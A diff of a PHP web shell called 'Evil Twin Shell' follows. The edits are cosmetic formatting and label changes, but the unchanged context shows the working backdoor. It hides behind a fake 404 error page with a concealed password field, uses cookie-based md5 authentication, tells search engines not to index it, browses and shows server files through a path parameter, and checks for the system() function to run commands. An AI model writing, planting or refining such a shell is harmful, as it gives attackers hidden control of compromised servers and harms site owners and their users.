@@ -11,36 +11,35 @@
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
 
-if(get_magic_quotes_gpc()) { 	
-function VEstripslashes($array) { 		return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array); 	} 	
+if(get_magic_quotes_gpc()) {
+function VEstripslashes($array) {
+return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array);} 	
 $_POST = VEstripslashes($_POST); 
 $_COOKIE = VEstripslashes($_COOKIE); } 
 function Login() {
-	die("<h1>Not Found</h1>
+	die("<title>Not Found</title>
+<h1>Not Found</h1>
 <p>The requested URL was not found on this server.</p>
 <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>
 <style>input { margin:0;background-color:#fff;border:1px solid #fff; }</style>
     <pre align=center><form method=post><input type=password name=pass></form></pre>");
 }
-
 function VEsetcookie($k, $v) {
     $_COOKIE[$k] = $v;
     setcookie($k, $v);
 }
-
 if(!empty($auth_pass)) {
     if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
         VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
-
     if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
         Login();
 }
 echo '<!DOCTYPE HTML>
 <html>
 <head>
-<meta name="robots" content="noindex, nofollow">
-<meta name="theme-color" content="#434343">
 <title>Evil Twin Shell</title>
+<meta name="robots" content="NOINDEX, NOFOLLOW">
+<meta name="theme-color" content="#434343">
 <link href="https://fonts.googleapis.com/css2?family=Metal+Mania&display=swap" rel="stylesheet">
 <link href="https://fonts.googleapis.com/css2?family=Philosopher&display=swap" rel="stylesheet">
 <link rel="icon" href="https://i.ibb.co/QjwrL9y/Sec666-Fadly31337.jpg" type="image/jpeg">
@@ -97,9 +96,9 @@ border-radius:4px;
 </style>
 </head>
 <body>
-<center><span class="we"><a href="?" class="evil">EVIL TWIN SHELL</a></span></center>
+<center><span class="we"><a href="?" class="evil">$ EVIL TWIN SHELL $</a></span></center>
 <table width="780" border="0" cellpadding="3" cellspacing="1" align="center">
-<center><tr><td><font>Path :</font> ';
+<tr><td><font>Path : </font> ';
 if(isset($_GET['path'])){
 $path = $_GET['path'];
 }else{
@@ -324,12 +323,11 @@ if(function_exists('opendir')) {
 }
 echo '<div id="content"><table width="780" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr class="EviL">
-<td><center>Name</center></td>
-<td><center>Size</center></td>
-<td><center>Permission</center></td>
-<td><center>Modify</center></td>
+<td><center>NAME</center></td>
+<td><center>SIZE</center></td>
+<td><center>PERMISSION</center></td>
+<td><center>MODIFY</center></td>
 </tr>';
-
 foreach($scandir as $dir){
 if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
 echo '<tr>
@@ -365,7 +363,6 @@ $size = round($size/1024,2).' MB';
 }else{
 $size = $size.' KB';
 }
-
 echo '<tr>
 <td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
 <td><center>'.$size.'</center></td>
@@ -422,7 +419,6 @@ if(function_exists('system')) {
 }
 function perms($file){
 $perms = fileperms($file);
- 
 if (($perms & 0xC000) == 0xC000) {
 $info = 's';
 } elseif (($perms & 0xA000) == 0xA000) {
@@ -440,25 +436,21 @@ $info = 'p';
 } else {
 $info = 'u';
 }
-
 $info .= (($perms & 0x0100) ? 'r' : '-');
 $info .= (($perms & 0x0080) ? 'w' : '-');
 $info .= (($perms & 0x0040) ?
 (($perms & 0x0800) ? 's' : 'x' ) :
 (($perms & 0x0800) ? 'S' : '-'));
-
 $info .= (($perms & 0x0020) ? 'r' : '-');
 $info .= (($perms & 0x0010) ? 'w' : '-');
 $info .= (($perms & 0x0008) ?
 (($perms & 0x0400) ? 's' : 'x' ) :
 (($perms & 0x0400) ? 'S' : '-'));
-
 $info .= (($perms & 0x0004) ? 'r' : '-');
 $info .= (($perms & 0x0002) ? 'w' : '-');
 $info .= (($perms & 0x0001) ?
 (($perms & 0x0200) ? 't' : 'x' ) :
 (($perms & 0x0200) ? 'T' : '-'));
-
 return $info;
 }
 ?>
